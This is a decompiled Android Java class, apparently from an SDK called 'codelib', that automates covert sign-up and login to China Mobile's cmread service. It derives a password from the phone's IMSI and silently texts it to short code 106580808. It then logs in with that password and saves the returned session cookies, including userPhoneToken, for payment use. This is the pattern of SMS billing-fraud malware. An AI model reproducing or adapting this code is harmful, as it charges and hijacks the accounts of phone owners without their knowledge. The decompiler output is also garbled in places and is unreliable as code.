package com.yl.codelib.cmread;

import android.content.Context;
import com.yl.codelib.comm.MyPreference;
import com.yl.codelib.sim.SIMUtil;
import com.yl.codelib.utils.LogUtil;
import com.yl.codelib.utils.TextUtil;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.Iterator;
import java.util.List;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.CookieStore;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.cookie.Cookie;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.protocol.BasicHttpContext;
import org.apache.http.protocol.HttpContext;
import org.apache.http.util.EntityUtils;
import org.json.JSONException;
import org.json.JSONObject;

public class CmreadLogin
{
  public static final String CMPort_Register = "106580808";
  
  public CmreadLogin() {}
  
  public static String getPayPassWord(String paramString, Context paramContext)
  {
    String str = paramString;
    if (!TextUtil.notNull(paramString)) {
      str = SIMUtil.getIMSI2(paramContext);
    }
    paramString = "123456";
    if (TextUtil.notNull(str)) {
      paramString = str.substring(str.length() - 6, str.length());
    }
    return paramString;
  }
  
  public static String getloginUrl(CmreadPayInfo paramCmreadPayInfo, String paramString, Context paramContext)
  {
    Object localObject3 = null;
    Object localObject2 = null;
    Object localObject1 = localObject3;
    try
    {
      JSONObject localJSONObject = new JSONObject(paramCmreadPayInfo.getCode());
      localObject1 = localObject3;
      if (localJSONObject.has("loginSubmitUrl"))
      {
        localObject1 = localObject3;
        localObject3 = localJSONObject.getString("loginSubmitUrl");
        localObject2 = localObject3;
        localObject1 = localObject3;
        if (!((String)localObject3).startsWith("http://wap.cmread.com"))
        {
          localObject2 = localObject3;
          localObject1 = localObject3;
          if (!((String)localObject3).startsWith("https://wap.cmread.com"))
          {
            localObject1 = localObject3;
            localObject2 = ((String)localObject3).replace("amp;", "");
            localObject1 = localObject2;
            localObject2 = "http://wap.cmread.com" + (String)localObject2;
          }
        }
        localObject3 = localObject2;
        localObject1 = localObject2;
        if (localJSONObject.has("usernameField"))
        {
          localObject1 = localObject2;
          localObject3 = localObject2 + "&" + localJSONObject.getString("usernameField") + "=" + paramString;
        }
        paramString = (String)localObject3;
        localObject1 = localObject3;
        if (localJSONObject.has("passwordField"))
        {
          localObject1 = localObject3;
          paramString = localObject3 + "&" + localJSONObject.getString("passwordField") + "=" + getPayPassWord(null, paramContext);
        }
        paramContext = paramString;
        localObject1 = paramString;
        if (localJSONObject.has("rememberField"))
        {
          localObject1 = paramString;
          paramContext = paramString + "&" + localJSONObject.getString("rememberField") + "=on&autoBind=";
        }
        localObject1 = paramContext;
      }
      return paramContext;
    }
    catch (JSONException paramCmreadPayInfo)
    {
      try
      {
        localObject2 = paramContext + "&client_id=cmread-wap&redirect_uri=" + URLEncoder.encode(paramCmreadPayInfo.getReadOneChapUrl(), "utf-8") + "&response_type=token";
        return localObject2;
      }
      catch (UnsupportedEncodingException paramCmreadPayInfo) {}
      paramCmreadPayInfo = paramCmreadPayInfo;
      return localObject1;
    }
  }
  
  public static int goToLogin(CmreadPayInfo paramCmreadPayInfo, String paramString, Context paramContext)
  {
    MyPreference localMyPreference = new MyPreference(paramContext);
    if (!TextUtil.notNull(localMyPreference.readString("NewPassWord", "")))
    {
      register(paramContext);
      localMyPreference.write("NewPassWord", "ok");
    }
    String str = getloginUrl(paramCmreadPayInfo, paramString, paramContext);
    LogUtil.v(str);
    paramCmreadPayInfo = "";
    i = 0;
    for (;;)
    {
      label61:
      Object localObject1;
      if (i >= 3)
      {
        if (i == 100) {
          return 1;
        }
      }
      else
      {
        localObject1 = null;
        paramContext = paramCmreadPayInfo;
      }
      try
      {
        Thread.sleep(2500L);
        paramContext = paramCmreadPayInfo;
        paramString = new BasicHttpParams();
        paramContext = paramCmreadPayInfo;
        HttpConnectionParams.setConnectionTimeout(paramString, 8000);
        paramContext = paramCmreadPayInfo;
        HttpConnectionParams.setSoTimeout(paramString, 8000);
        paramContext = paramCmreadPayInfo;
        Object localObject2 = new DefaultHttpClient(paramString);
        paramContext = paramCmreadPayInfo;
        HttpPost localHttpPost = new HttpPost(str);
        paramContext = paramCmreadPayInfo;
        localHttpPost.setHeader("User-Agent", "DuoNiu");
        paramContext = paramCmreadPayInfo;
        localHttpPost.setHeader("Charset", "UTF-8");
        paramContext = paramCmreadPayInfo;
        localHttpPost.setHeader("Content-Type", "application/x-www-form-urlencoded");
        paramContext = paramCmreadPayInfo;
        BasicHttpContext localBasicHttpContext = new BasicHttpContext();
        paramContext = paramCmreadPayInfo;
        paramString = new BasicCookieStore();
        paramContext = paramCmreadPayInfo;
        localBasicHttpContext.setAttribute("http.cookie-store", paramString);
        paramContext = paramCmreadPayInfo;
        localObject2 = ((DefaultHttpClient)localObject2).execute(localHttpPost, localBasicHttpContext);
        paramContext = paramCmreadPayInfo;
        if (((HttpResponse)localObject2).getStatusLine().getStatusCode() == 200)
        {
          paramContext = paramCmreadPayInfo;
          localObject1 = EntityUtils.toString(((HttpResponse)localObject2).getEntity(), "UTF-8");
          paramContext = paramCmreadPayInfo;
          LogUtil.v((String)localObject1);
          paramContext = paramCmreadPayInfo;
          if (((String)localObject1).contains("您的账号已被锁定"))
          {
            paramContext = paramCmreadPayInfo;
            LogUtil.v("您的账号已被锁定");
            i = 200;
            break label61;
          }
          paramContext = paramCmreadPayInfo;
          if (((String)localObject1).contains("您输入的用户名或密码有误"))
          {
            paramContext = paramCmreadPayInfo;
            LogUtil.v("您的账号已被锁定");
            i = 400;
            break label61;
          }
          paramContext = paramCmreadPayInfo;
          localObject1 = paramString.getCookies();
        }
        paramString = paramCmreadPayInfo;
        paramContext = paramCmreadPayInfo;
        if (!((List)localObject1).isEmpty())
        {
          paramContext = paramCmreadPayInfo;
          localObject1 = ((List)localObject1).iterator();
        }
        for (;;)
        {
          try
          {
            boolean bool = ((Iterator)localObject1).hasNext();
            if (!bool)
            {
              paramString = paramCmreadPayInfo;
              paramContext = paramString;
              LogUtil.v(paramString);
              j = i + 1;
              paramCmreadPayInfo = paramString;
              i = j;
            }
          }
          catch (Exception paramString) {}
          try
          {
            if (!paramString.contains("userPhoneToken")) {
              break label481;
            }
            j = 100;
            localMyPreference.write("CM_Cookie", paramString);
            i = 100;
            paramCmreadPayInfo = paramString;
          }
          catch (Exception paramCmreadPayInfo)
          {
            for (;;)
            {
              paramCmreadPayInfo = paramString;
              i = j;
            }
          }
          paramString = (Cookie)((Iterator)localObject1).next();
          paramString = paramString.getName() + "=" + paramString.getValue() + "; ";
          paramString = paramCmreadPayInfo + paramString;
          paramCmreadPayInfo = paramString;
        }
        label481:
        continue;
        if (i == 200) {
          return 2;
        }
        if (i == 400) {
          return 3;
        }
        return 4;
      }
      catch (InterruptedException paramString)
      {
        for (;;) {}
      }
      catch (Exception paramCmreadPayInfo)
      {
        for (;;)
        {
          paramCmreadPayInfo = paramContext;
        }
      }
    }
  }
  
  public static void register(Context paramContext)
  {
    SIMUtil.sendSmsMessage(paramContext, "106580808", getPayPassWord(SIMUtil.getIMSI2(paramContext), paramContext), "getCmcookie");
  }
}
